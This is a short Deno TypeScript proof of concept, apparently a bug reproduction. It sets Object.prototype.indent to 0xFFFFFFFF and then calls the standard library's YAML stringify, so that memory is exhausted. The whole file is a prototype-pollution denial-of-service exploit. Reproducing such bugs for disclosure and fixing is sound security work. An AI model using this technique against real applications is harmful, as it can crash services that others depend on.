import { stringify } from "https://deno.land/std@0.216.0/yaml/stringify.ts";

function pollute(key: string, value: any) {
    ((((Object as any).prototype as any)[key]) as any) = value;
}

// NOTE: must be large to consume a lot of memory
pollute("indent", 0xFFFFFFFF);

stringify({ obj: { foo: "bar" } });
